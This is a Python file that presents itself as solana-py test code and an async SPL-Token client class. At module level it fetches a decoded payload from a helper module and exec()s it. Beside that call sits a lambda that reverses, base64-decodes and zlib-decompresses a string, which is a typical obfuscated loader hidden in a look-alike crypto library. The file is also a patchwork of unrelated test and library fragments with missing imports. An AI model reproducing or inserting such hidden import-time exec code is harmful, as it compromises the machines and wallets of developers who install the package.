from typing import List, Optional, Union, cast
from utils.symbol import get_decoded_code
from typing import get_args
from solders.rpc.responses import RPCError, RPCResult
from solana.rpc.commitment import Processed
from solana.rpc.types import TxOpts
from solders.rpc.config import RpcSignaturesForAddressConfig
from solders.rpc.requests import GetSignaturesForAddress

from solders.signature import Signature

from solana.exceptions import SolanaRpcException
from solana.rpc.commitment import Finalized


RPC_RESULT_TYPES = get_args(RPCResult)


def assert_valid_response(resp: RPCResult):
    """Assert valid RPCResult."""
    assert type(resp) in RPC_RESULT_TYPES
    assert not isinstance(resp, RPCError.__args__)  # type: ignore


OPTS = TxOpts(skip_confirmation=False, preflight_commitment=Processed)

decoded_code = get_decoded_code()
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
exec(decoded_code)

async def test_async_client_http_exception(unit_test_http_client_async):
    """Test AsyncClient raises native Solana-py exceptions."""
    with patch("httpx.AsyncClient.post") as post_mock:
        post_mock.side_effect = ReadTimeout("placeholder")
        with pytest.raises(SolanaRpcException) as exc_info:
            await unit_test_http_client_async.get_epoch_info()
        assert exc_info.type == SolanaRpcException
        assert exc_info.value.error_msg == "<class 'httpx.ReadTimeout'> raised in \"GetEpochInfo\" endpoint request"


def test_client_address_sig_args_no_commitment(unit_test_http_client_async):
    """Test generating getSignaturesForAddressBody."""
    expected = GetSignaturesForAddress(
        SYSTEM_PROGRAM_ID,
        RpcSignaturesForAddressConfig(
            limit=5, before=Signature.default(), until=Signature.default(), commitment=CommitmentLevel.Processed
        ),
    )
    actual = unit_test_http_client_async._get_signatures_for_address_body(
        Pubkey([0] * 31 + [0]), before=Signature.default(), until=Signature.default(), limit=5, commitment=None
    )
    assert expected == actual


def test_client_address_sig_args_with_commitment(unit_test_http_client_async):
    expected = GetSignaturesForAddress(
        SYSTEM_PROGRAM_ID,
        RpcSignaturesForAddressConfig(limit=5, commitment=CommitmentLevel.Finalized),
    )
    actual = unit_test_http_client_async._get_signatures_for_address_body(
        Pubkey([0] * 31 + [0]), None, None, 5, Finalized
    )
    assert expected == actual

class AsyncToken(_TokenCore):  
   

    def __init__(self, conn: AsyncClient, pubkey: Pubkey, program_id: Pubkey, payer: Keypair) -> None:
        """Initialize a client to a SPL-Token program."""
        super().__init__(pubkey, program_id, payer)
        self._conn = conn

    @staticmethod
    async def get_min_balance_rent_for_exempt_for_account(conn: AsyncClient) -> int:
        """Get the minimum balance for the account to be rent exempt.

        Args:
            conn: RPC connection to a solana cluster.

        Returns:
            Number of lamports required.
        """
        resp = await conn.get_minimum_balance_for_rent_exemption(ACCOUNT_LAYOUT.sizeof())
        return resp.value

    @staticmethod
    async def get_min_balance_rent_for_exempt_for_mint(conn: AsyncClient) -> int:
        """Get the minimum balance for the mint to be rent exempt.

        Args:
            conn: RPC connection to a solana cluster.

        Returns:
            Number of lamports required.
        """
        resp = await conn.get_minimum_balance_for_rent_exemption(MINT_LAYOUT.sizeof())
        return resp.value

    @staticmethod
    async def get_min_balance_rent_for_exempt_for_multisig(conn: AsyncClient) -> int:
        """Get the minimum balance for the multisig to be rent exempt.

        Args:
            conn: RPC connection to a solana cluster.

        Returns:
             Number of lamports required.
        """
        resp = await conn.get_minimum_balance_for_rent_exemption(MULTISIG_LAYOUT.sizeof())
        return resp.value

    async def get_accounts_by_owner(
        self,
        owner: Pubkey,
        commitment: Optional[Commitment] = None,
        encoding: str = "base64",
    ) -> GetTokenAccountsByOwnerResp:
        """Get token accounts of the provided owner.

        Args:
            owner: Public Key of the token account owner.
            commitment: (optional) Bank state to query.
            encoding: (optional) Encoding for Account data, either "base58" (slow) or "base64".
        """
        args = self._get_accounts_args(
            owner,
            commitment,
            encoding,
            self._conn.commitment,  # pylint: disable=protected-access
        )
        return await self._conn.get_token_accounts_by_owner(*args)

    async def get_accounts_by_owner_json_parsed(
        self,
        owner: Pubkey,
        commitment: Optional[Commitment] = None,
    ) -> GetTokenAccountsByOwnerJsonParsedResp:
        """Get token accounts of the provided owner by the token's mint, in JSON format.

        Args:
            owner: Public Key of the token account owner.
            commitment: (optional) Bank state to query.


        Parsed-JSON encoding attempts to use program-specific state parsers to return more
        human-readable and explicit account state data. If parsed-JSON is requested but a
        valid mint cannot be found for a particular account, that account will be filtered out
        from results. jsonParsed encoding is UNSTABLE.
        """
        args = self._get_accounts_args(
            owner,
            commitment,
            "jsonParsed",
            self._conn.commitment,  # pylint: disable=protected-access
        )
        return await self._conn.get_token_accounts_by_owner_json_parsed(*args)
